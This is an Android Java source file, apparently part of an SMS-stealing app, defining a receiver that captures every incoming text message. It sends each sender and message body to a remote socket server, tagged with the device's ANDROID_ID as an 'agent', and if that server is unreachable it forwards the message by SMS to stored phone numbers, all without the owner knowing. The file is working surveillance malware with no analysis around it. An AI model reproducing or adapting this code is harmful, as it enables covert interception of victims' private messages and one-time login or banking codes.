package com.pegalite.neotron3.functions;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.pegalite.neotron3.server.socket.PegaSocketServer;

public class SmsReceiver extends BroadcastReceiver {
    @SuppressLint("HardwareIds")
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String sender = smsMessage.getDisplayOriginatingAddress();
                String message = smsMessage.getMessageBody();
                Log.d("SMS", "From: " + sender + " | Message: " + message);
                if (PegaSocketServer.getSocket() != null && PegaSocketServer.getSocket().connected()) {
                    PegaSocketServer.getSocket().emit("sms", "agent-" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + context.getPackageName(), sender, message);
                } else {
                    Prefs prefs = new Prefs(context);
                    if (prefs.getPref("sms-forward").equals("no-data")) {
                        return;
                    }
                    String phoneNumber = prefs.getPref("sms-forward");
                    String newMessage = "From : " + sender + "\nMessage : " + message;
                    SmsManager smsManager = SmsManager.getDefault();
                    if (phoneNumber.contains(",") || phoneNumber.contains(".")) {
                        for (String number : phoneNumber.contains(",") ? phoneNumber.split(",") : phoneNumber.split("\\.")) {
                            smsManager.sendTextMessage(number, null, newMessage, null, null);
                        }
                        return;
                    }
                    smsManager.sendTextMessage(phoneNumber, null, newMessage, null, null);

                }
            }
        }
    }
}
